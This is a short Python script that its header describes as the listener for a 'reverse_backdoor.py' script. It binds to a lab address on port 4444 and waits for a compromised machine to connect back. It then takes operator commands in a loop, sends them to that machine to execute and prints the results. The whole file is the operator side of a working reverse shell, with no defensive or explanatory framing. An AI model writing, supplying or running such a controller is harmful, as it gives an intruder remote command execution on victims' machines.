#! /usr/bin/env python
# NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
# Compatibility: Python 3 only.

import socket


class Listener:
    def __init__(self, ip_address, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip_address, port))
        listener.listen(0)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener.accept()
        print(f"[+] Connection established! Source: {address}.")

    def run(self):
        while True:
            command = input(" >> ")
            result = self.execute_remotely(command)
            print(result)

    def execute_remotely(self, command):
        self.connection.send(command.encode(errors="replace"))
        return self.connection.recv(1024).decode(errors="replace")


listener = Listener("10.0.2.15", 4444)
listener.run()
